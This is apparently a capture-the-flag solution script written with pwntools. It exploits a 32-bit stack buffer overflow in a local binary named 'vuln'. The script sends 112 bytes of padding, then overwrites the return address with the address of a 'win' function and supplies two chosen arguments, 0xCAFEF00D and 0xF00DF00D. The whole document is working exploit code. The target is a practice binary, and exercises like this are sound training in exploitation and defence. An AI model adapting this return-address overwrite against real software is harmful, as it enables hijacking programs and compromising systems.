from pwn import *

offset = 108 + 4 #112
win_addr = 0x08049296
argv1 = 0xCAFEF00D
argv2 = 0xF00DF00D


r = process("./vuln")
r.recvuntil(b"Please enter your string:")
r.sendline(b"A"*offset + p32(win_addr) + p32(0x1) + p32(argv1) + p32(argv2))
print(r.recvline())
print(r.recvline())
#print(r.interactive())
